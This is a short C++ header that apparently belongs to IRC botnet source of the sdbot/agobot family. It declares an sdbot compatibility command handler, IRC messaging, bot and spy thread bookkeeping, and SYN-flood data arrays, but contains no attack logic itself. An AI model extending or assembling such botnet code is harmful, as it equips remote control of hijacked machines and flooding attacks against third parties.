
#ifndef __SDCOMPAT_H__
#define __SDCOMPAT_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"
#include "skythread.h"

void irc_privmsg(SOCKET sock,char *a,char *msgstr,bool notice);
int spyaddthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir);
int addthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir);

class CsdbotCompat : public CCommandHandler
{
public:
	thread threads[40];
	thred threds[40];
	syndata syn[30];
	void Init();										// Do initialization here
	int Compat(char *a[32], bool notice, bool silent,char *msg_real_dest);	// Insert your sdbot stuff here
	bool HandleCommand(CMessage *pMsg);
	command	m_cmdTest;
};

#endif // __SDCOMPAT_H__
